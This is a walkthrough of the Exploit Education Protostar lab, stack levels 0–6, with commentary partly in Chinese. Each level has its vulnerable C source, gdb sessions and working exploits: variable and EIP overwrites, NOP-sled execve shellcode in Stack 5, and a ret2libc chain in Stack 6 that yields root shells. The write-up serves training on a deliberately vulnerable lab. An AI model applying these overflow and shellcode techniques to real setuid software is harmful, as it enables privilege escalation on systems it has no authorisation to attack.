---
title: Exploit Education：Protostar
---

> The levels to be exploited can be found in the /opt/protostar/bin directory.

## Stack 0

> memory can be accessed outside of its allocated region

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified; // volatile tells the compiler not to cache the value of `modified`
  char buffer[64];

  modified = 0;
  gets(buffer); // Never use gets().
  // Because it's impossible to tell without knowing the data in advance
  // how many characters gets() will read, and gets() will continue to
  // store characters past the end of the buffer

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

??? note "Dump of assembler code for function main"

    ```bash
    (gdb) set disassembly-flavor intel
    (gdb) disassemble main
    Dump of assembler code for function main:
    0x080483f4 <main+0>:	push   ebp
    0x080483f5 <main+1>:	mov    ebp,esp
    0x080483f7 <main+3>:	and    esp,0xfffffff0
    0x080483fa <main+6>:	sub    esp,0x60
    0x080483fd <main+9>:	mov    DWORD PTR [esp+0x5c],0x0 # modified = 0
    0x08048405 <main+17>:	lea    eax,[esp+0x1c]
    0x08048409 <main+21>:	mov    DWORD PTR [esp],eax  # passing the address of buffer to gets()
    0x0804840c <main+24>:	call   0x804830c <gets@plt>
    0x08048411 <main+29>:	mov    eax,DWORD PTR [esp+0x5c] # starting to check the value of modified
    0x08048415 <main+33>:	test   eax,eax
    0x08048417 <main+35>:	je     0x8048427 <main+51>
    0x08048419 <main+37>:	mov    DWORD PTR [esp],0x8048500
    0x08048420 <main+44>:	call   0x804832c <puts@plt>
    0x08048425 <main+49>:	jmp    0x8048433 <main+63>
    0x08048427 <main+51>:	mov    DWORD PTR [esp],0x8048529
    0x0804842e <main+58>:	call   0x804832c <puts@plt>
    0x08048433 <main+63>:	leave  
    0x08048434 <main+64>:	ret    
    End of assembler dump.
    ```

```bash
(gdb) break *0x0804840c
Breakpoint 2 at 0x804840c: file stack0/stack0.c, line 11.
(gdb) break *0x08048411
Breakpoint 3 at 0x8048411: file stack0/stack0.c, line 13.
(gdb) define hook-stop  # define a hook, some commands will be executed when stops
# Note: some unimportant output parts are omitted below
Type commands for definition of "hook-stop".
End with a line saying just "end".
>info registers
>x/24wx $esp
>x/2i $eip
>end
(gdb) r
Starting program: /opt/protostar/bin/stack0
(gdb) c
Continuing.
THISISTHEINPUT  # 544849534953544845494e505554
eax            0xbffff65c	-1073744292
ecx            0xbffff65c	-1073744292
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff640	0xbffff640
ebp            0xbffff6a8	0xbffff6a8
esi            0x0	0
edi            0x0	0
eip            0x8048411	0x8048411 <main+29>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
0xbffff640:	0xbffff65c	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffff650:	0xb7fd7ff4	0xb7ec6165	0xbffff668	0x53494854  # start from here
0xbffff660:	0x48545349	0x504e4945	0xbf005455	0x080482e8
0xbffff670:	0xb7ff1040	0x08049620	0xbffff6a8	0x08048469
0xbffff680:	0xb7fd8304	0xb7fd7ff4	0x08048450	0xbffff6a8
0xbffff690:	0xb7ec6365	0xb7ff1040	0x0804845b	0x00000000  # need at least 16 bytes + 1 bit to overwrite the value of `modified`
0x8048411 <main+29>:	mov    eax,DWORD PTR [esp+0x5c]
0x8048415 <main+33>:	test   eax,eax

Breakpoint 3, main (argc=1, argv=0xbffff754) at stack0/stack0.c:13
13	in stack0/stack0.c
(gdb) x/wx $esp+0x5c    # check the value of `modified`
0xbffff69c:	0x00000000
```

```bash
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/stack0
(gdb) c
Continuing.
123456789012345678901234567890123456789012345678901234567890ABCDE
eax            0xbffff65c	-1073744292
ecx            0xbffff65c	-1073744292
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff640	0xbffff640
ebp            0xbffff6a8	0xbffff6a8
esi            0x0	0
edi            0x0	0
eip            0x8048411	0x8048411 <main+29>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
0xbffff640:	0xbffff65c	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffff650:	0xb7fd7ff4	0xb7ec6165	0xbffff668	0x34333231
0xbffff660:	0x38373635	0x32313039	0x36353433	0x30393837
0xbffff670:	0x34333231	0x38373635	0x32313039	0x36353433
0xbffff680:	0x30393837	0x34333231	0x38373635	0x32313039
0xbffff690:	0x36353433	0x30393837	0x44434241	0x00000045
0x8048411 <main+29>:	mov    eax,DWORD PTR [esp+0x5c]
0x8048415 <main+33>:	test   eax,eax

Breakpoint 3, main (argc=1, argv=0xbffff754) at stack0/stack0.c:13
13	in stack0/stack0.c
(gdb) x/wx $esp+0x5c
0xbffff69c:	0x00000045
(gdb) c
Continuing.
you have changed the 'modified' variable
```

### Exploit

```bash
$ python -c 'print("A" * 65)' | ./stack0
you have changed the 'modified' variable
```

## Stack 1

> Protostar is little endian

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {  // 'dcba' in little endian
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

### Exploit

```bash
$ ./stack1 $(python -c 'print("A" * 64 + "dcba")')
you have correctly got the variable to the right value
```

## Stack 2

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {  // '\n\r\n\r' in little endian
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

### Exploit

```bash
$ GREENIE=$(python -c "print('a' * 64 + '\n\r' * 2)") ./stack2
you have correctly modified the variable
```

## Stack 3

> overwriting function pointers stored on the stack

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;
  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

```bash
(gdb) x win
0x8048424 <win>:	0x83e58955
(gdb) p win # print the value of expression
$1 = {void (void)} 0x8048424 <win>
```

### Exploit

```bash
$ python -c "print('a' * 64 + '\x24\x84\x04\x08')" | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

## Stack 4

> overwriting saved EIP

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

- 首先测试一下覆盖点的位置
  
    ```py
    from __future__ import print_function
    for i in range(ord('A'), ord('Z')):
        print(chr(i) * 4, end='')
    ```

    ```bash
    $ python /tmp/stack.py > /tmp/test
    $ gdb ./stack4
    (gdb) r < /tmp/test
    Starting program: /opt/protostar/bin/stack4 < /tmp/test

    Program received signal SIGSEGV, Segmentation fault.
    0x54545454 in ?? () # T
    ```

- 获取函数 `win` 的地址

    ```bash
    $ objdump -t stack4 | grep win
    080483f4 g     F .text	00000014              win
    ```

### Exploit

```bash
$ python -c "print('a' * 19 * 4 + '\xf4\x83\x04\x08')" | ./stack4
code flow successfully changed
Segmentation fault
```

- 可以使用 `struct` 简化

    ```py
    >>> import struct
    >>> struct.pack('I', 0x080483f4)
    '\xf4\x83\x04\x08'
    ```

## Stack 5

> If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

- 首先需要确定可以控制 EIP 的溢出点

    ```py
    from __future__ import print_function
    for i in range(ord('A'), ord('Z') + 1):
        print(chr(i) * 4, end='')
    ```

    ```bash
    $ python /tmp/stack.py > /tmp/test
    $ gdb ./stack5
    (gdb) disassemble main
    Dump of assembler code for function main:
    0x080483c4 <main+0>:	push   %ebp
    0x080483c5 <main+1>:	mov    %esp,%ebp
    0x080483c7 <main+3>:	and    $0xfffffff0,%esp
    0x080483ca <main+6>:	sub    $0x50,%esp
    0x080483cd <main+9>:	lea    0x10(%esp),%eax
    0x080483d1 <main+13>:	mov    %eax,(%esp)
    0x080483d4 <main+16>:	call   0x80482e8 <gets@plt>
    0x080483d9 <main+21>:	leave  
    0x080483da <main+22>:	ret    
    End of assembler dump.
    (gdb) break *0x080483da # ret
    (gdb) define hook-stop
    Type commands for definition of "hook-stop".
    End with a line saying just "end".
    >x/1i $eip
    >x/8wx $esp
    >end
    ```

    ```bash
    (gdb) r < /tmp/test
    Starting program: /opt/protostar/bin/stack5 < /tmp/test
    0x80483da <main+22>:	ret    
    0xbffff6ac:	0x54545454	0x55555555	0x56565656	0x57575757
    0xbffff6bc:	0x58585858	0x59595959	0x5a5a5a5a	0xb7ffef00

    Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x5353535b
    ) at stack5/stack5.c:11
    11	stack5/stack5.c: No such file or directory.
      in stack5/stack5.c
    (gdb) si
    Cannot access memory at address 0x53535357
    (gdb) si

    Program received signal SIGSEGV, Segmentation fault.
    0x54545454:	Error while running hook_stop:
    Cannot access memory at address 0x54545454
    0x54545454 in ?? () # T
    ```

- 至于跳转的位置 =v= 可以简单地选择为能够控制 EIP 溢出点的下一个地址，即以下的 `0xbffff6b0`（`0x55555555` 对应的位置）

    ```bash
    Starting program: /opt/protostar/bin/stack5 < /tmp/test
    0x80483da <main+22>:	ret    
    0xbffff6ac:	0x54545454	0x55555555	0x56565656	0x57575757
    0xbffff6bc:	0x58585858	0x59595959	0x5a5a5a5a	0xb7ffef00

    Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x5353535b
    ) at stack5/stack5.c:11
    11	in stack5/stack5.c
    (gdb) si
    Cannot access memory at address 0x53535357
    (gdb) info registers 
    eax            0xbffff660	-1073744288
    ecx            0xbffff660	-1073744288
    edx            0xb7fd9334	-1208118476
    ebx            0xb7fd7ff4	-1208123404
    esp            0xbffff6b0	0xbffff6b0
    ebp            0x53535353	0x53535353
    esi            0x0	0
    edi            0x0	0
    eip            0x54545454	0x54545454
    eflags         0x200246	[ PF ZF IF ID ]
    cs             0x73	115
    ss             0x7b	123
    ds             0x7b	123
    es             0x7b	123
    fs             0x0	0
    gs             0x33	51
    ```

- 但由于环境变量的存在，能够控制 EIP 溢出点对应的地址并不是固定的，那么也没法确定要跳转的下一地址。可以简单地通过填充 NOP(No Operation) 指令来解决环境变量导致的地址不一致问题
- 先试试下个断点~

    ```py
    import struct
    eip = struct.pack('I', 0xbffff6b0 + 16) # 保证跳转在 NOP 里 > <
    nop = '\x90' * 64
    print('a' * 19 * 4 + eip + nop + '\xcc' * 4)
    ```

    ```bash
    $ python /tmp/stack.py > /tmp/break
    $ ./stack5 < /tmp/break
    Trace/breakpoint trap
    ```

- 接下来将 INT3 指令替换为 `shellcode`

    ```py
    import struct
    eip = struct.pack('I', 0xbffff6b0 + 16)
    nop = '\x90' * 64
    shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
    print('a' * 19 * 4 + eip + nop + shellcode)
    # http://shell-storm.org/shellcode/files/shellcode-811.php
    ```

    ```bash
    $ python /tmp/stack.py | ./stack5 # nothing happened (ŏωŏ)
    $ python /tmp/stack.py > /tmp/getshell
    $ gdb ./stack5
    (gdb) r < /tmp/getshell
    Starting program: /opt/protostar/bin/stack5 < /tmp/getshell
    Executing new program: /bin/dash
    # 通过 gdb 可以看到 shell 能够获取
    Program exited normally.
    ```

- 可以通过 `cat` 来保证获得 `shell` 后不直接退出

    ```bash
    $ (python /tmp/stack.py; cat) | ./stack5
    id
    uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
    whoami
    root
    ```

## Stack 6

> what happens when you have restrictions on the return address

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);  // read the current return address from the stack

  if((ret & 0xbf000000) == 0xbf000000) {  // check the return address if it starts with 0xbf
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

- 首先测试能够控制 EIP 的溢出点（与先前的方法相同，位置对应 `U`）
- 通过 `gdb` 可以看到 `0xbf` 开头的地址对应 `stack`

    ```bash
    $ gdb ./stack6
    (gdb) break *getpath
    Breakpoint 1 at 0x8048484: file stack6/stack6.c, line 7.
    (gdb) r
    Starting program: /opt/protostar/bin/stack6 

    Breakpoint 1, getpath () at stack6/stack6.c:7
    7	stack6/stack6.c: No such file or directory.
      in stack6/stack6.c
    (gdb) info proc map
    process 2921
    cmdline = '/opt/protostar/bin/stack6'
    cwd = '/opt/protostar/bin'
    exe = '/opt/protostar/bin/stack6'
    Mapped address spaces:

      Start Addr   End Addr       Size     Offset objfile
      0x8048000  0x8049000      0x1000          0        /opt/protostar/bin/stack6
      0x8049000  0x804a000      0x1000          0        /opt/protostar/bin/stack6
      0xb7e96000 0xb7e97000     0x1000          0        
      0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
      0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
      0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
      0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
      0xb7fd9000 0xb7fdc000     0x3000          0        
      0xb7fe0000 0xb7fe2000     0x2000          0        
      0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
      0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
      0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
      0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
      0xbffeb000 0xc0000000    0x15000          0           [stack]
    ```

- `ret` 指令弹出栈顶存储的地址并跳转，那么可以先跳转到 `ret` 本身绕过检查，接下来再跳转到栈就可以了 :3

    ??? note "Dump of assembler code for function getpath"

        ```bash
        (gdb) disassemble getpath 
        Dump of assembler code for function getpath:
        0x08048484 <getpath+0>:	push   ebp
        0x08048485 <getpath+1>:	mov    ebp,esp
        0x08048487 <getpath+3>:	sub    esp,0x68
        0x0804848a <getpath+6>:	mov    eax,0x80485d0
        0x0804848f <getpath+11>:	mov    DWORD PTR [esp],eax
        0x08048492 <getpath+14>:	call   0x80483c0 <printf@plt>
        0x08048497 <getpath+19>:	mov    eax,ds:0x8049720
        0x0804849c <getpath+24>:	mov    DWORD PTR [esp],eax
        0x0804849f <getpath+27>:	call   0x80483b0 <fflush@plt>
        0x080484a4 <getpath+32>:	lea    eax,[ebp-0x4c]
        0x080484a7 <getpath+35>:	mov    DWORD PTR [esp],eax
        0x080484aa <getpath+38>:	call   0x8048380 <gets@plt>
        0x080484af <getpath+43>:	mov    eax,DWORD PTR [ebp+0x4]
        0x080484b2 <getpath+46>:	mov    DWORD PTR [ebp-0xc],eax
        0x080484b5 <getpath+49>:	mov    eax,DWORD PTR [ebp-0xc]
        0x080484b8 <getpath+52>:	and    eax,0xbf000000
        0x080484bd <getpath+57>:	cmp    eax,0xbf000000
        0x080484c2 <getpath+62>:	jne    0x80484e4 <getpath+96>
        0x080484c4 <getpath+64>:	mov    eax,0x80485e4
        0x080484c9 <getpath+69>:	mov    edx,DWORD PTR [ebp-0xc]
        0x080484cc <getpath+72>:	mov    DWORD PTR [esp+0x4],edx
        0x080484d0 <getpath+76>:	mov    DWORD PTR [esp],eax
        0x080484d3 <getpath+79>:	call   0x80483c0 <printf@plt>
        0x080484d8 <getpath+84>:	mov    DWORD PTR [esp],0x1
        0x080484df <getpath+91>:	call   0x80483a0 <_exit@plt>
        0x080484e4 <getpath+96>:	mov    eax,0x80485f0
        0x080484e9 <getpath+101>:	lea    edx,[ebp-0x4c]
        0x080484ec <getpath+104>:	mov    DWORD PTR [esp+0x4],edx
        0x080484f0 <getpath+108>:	mov    DWORD PTR [esp],eax
        0x080484f3 <getpath+111>:	call   0x80483c0 <printf@plt>
        0x080484f8 <getpath+116>:	leave  
        0x080484f9 <getpath+117>:	ret    
        End of assembler dump.
        ```

    ```py
    import struct
    ret = struct.pack('I', 0x080484f9)
    eip = struct.pack('I', 0xbffff6b0 + 16)
    nop = '\x90' * 64
    print('a' * 80 + ret + eip + nop + '\xcc' * 4) # just to hit the break point
    ```

    ```bash
    $ python /tmp/stack.py > /tmp/break
    $ gdb ./stack6
    (gdb) break *0x080484f9
    Breakpoint 1 at 0x80484f9: file stack6/stack6.c, line 23.
    (gdb) define hook-stop
    Type commands for definition of "hook-stop".
    End with a line saying just "end".
    >x/1i $eip
    >x/8wx $esp
    >end
    (gdb) r < /tmp/break 
    Starting program: /opt/protostar/bin/stack6 < /tmp/break
    input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�aaaaaaaaaaaa�������������������������������������������������������������������������
    0x80484f9 <getpath+117>:	ret    
    0xbffff69c:	0x080484f9	0xbffff6c0	0x90909090	0x90909090
    0xbffff6ac:	0x90909090	0x90909090	0x90909090	0x90909090

    Breakpoint 1, 0x080484f9 in getpath () at stack6/stack6.c:23
    23	stack6/stack6.c: No such file or directory.
      in stack6/stack6.c
    (gdb) si
    0x80484f9 <getpath+117>:	ret # ret again, because we jump to it
    0xbffff6a0:	0xbffff6c0	0x90909090	0x90909090	0x90909090
    0xbffff6b0:	0x90909090	0x90909090	0x90909090	0x90909090

    Breakpoint 1, 0x080484f9 in getpath () at stack6/stack6.c:23
    23	in stack6/stack6.c
    (gdb) 
    Cannot access memory at address 0x61616165
    (gdb) 
    0xbffff6c1:	nop
    0xbffff6a4:	0x90909090	0x90909090	0x90909090	0x90909090
    0xbffff6b4:	0x90909090	0x90909090	0x90909090	0x90909090
    0xbffff6c1 in ?? ()
    (gdb) c
    Continuing.

    Program received signal SIGTRAP, Trace/breakpoint trap.
    0xbffff6e5:	int3   
    0xbffff6a4:	0x90909090	0x90909090	0x90909090	0x90909090
    0xbffff6b4:	0x90909090	0x90909090	0x90909090	0x90909090
    0xbffff6e5 in ?? ()
    ```

> This level can be done in a couple of ways, such as finding the duplicate of the payload ( objdump -s will help with this), or ret2libc , or even return orientated programming.

- `system` 是 `libc` 函数，能够执行 `shell` 命令

    ```c
    #include <stdlib.h>

    void main() {
      system("/bin/sh");
    }
    ```

    ```bash
    $ gcc sys.c -o sys
    $ ./sys 
    $ id
    uid=1001(user) gid=1001(user) groups=1001(user)
    $ exit
    $ gdb ./sys
    (gdb) set disassembly-flavor intel
    (gdb) disassemble main 
    Dump of assembler code for function main:
    0x080483c4 <main+0>:	push   ebp
    0x080483c5 <main+1>:	mov    ebp,esp
    0x080483c7 <main+3>:	and    esp,0xfffffff0
    0x080483ca <main+6>:	sub    esp,0x10
    0x080483cd <main+9>:	mov    DWORD PTR [esp],0x80484a0 # 需执行的命令入栈
    0x080483d4 <main+16>:	call   0x80482ec <system@plt> # 调用函数会将 call 的下一条指令地址入栈
    0x080483d9 <main+21>:	leave  
    0x080483da <main+22>:	ret    
    End of assembler dump.
    (gdb) x/s 0x80484a0
    0x80484a0:	 "/bin/sh"
    ```

- `call system` 之后，栈应为以下结构

    <table>
    <tbody>
      <tr>
        <td>... ...</td>
      </tr>
      <tr>
        <td>call 下一条指令的地址</td>
      </tr>
      <tr>
        <td>0x80484a0（参数字符串所在的地址）</td>
      </tr>
    </tbody>
    </table>

- 控制 `getpath` 的 `ret` 返回到 `system`，因为没有使用 `call` 所以需要构造类似 `call` 产生的栈
- 可以借助 `libc` 传递所需的命令字符串

    ```bash
    # 获取 /bin/sh 在 libc 中的 offset
    # -t x: Print the location of the string in hex
    $ strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"
    11f3bf /bin/sh
    $ gdb ./stack6
    ...
    (gdb) p system  # system 的地址
    $1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
    (gdb) info proc map
    process 3986
    cmdline = '/opt/protostar/bin/stack6'
    cwd = '/opt/protostar/bin'
    exe = '/opt/protostar/bin/stack6'
    Mapped address spaces:

      Start Addr   End Addr       Size     Offset objfile
      0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
      0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
      0xb7e96000 0xb7e97000     0x1000          0        
      0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
      0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
      0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
      0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
      0xb7fd9000 0xb7fdc000     0x3000          0        
      0xb7fe0000 0xb7fe2000     0x2000          0        
      0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
      0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
      0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
      0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
      0xbffeb000 0xc0000000    0x15000          0           [stack]
    (gdb) x/s 0xb7e97000+0x11f3bf # offset 结合 libc 的起始地址可获得 /bin/sh 的地址
    0xb7fb63bf:	 "/bin/sh"
    ```

### Exploit

```py
import struct
system = struct.pack("I", 0xb7ecffb0)
ret_after_sys = 'AAAA'
bin_sh = struct.pack("I", 0xb7fb63bf)
print('a' * 80 + system + ret_after_sys + bin_sh) # ret2libc
```

```bash
$ (python /tmp/stack.py; cat) | ./stack6
input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa���aaaaaaaaaaaa���AAAA�c��
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
```
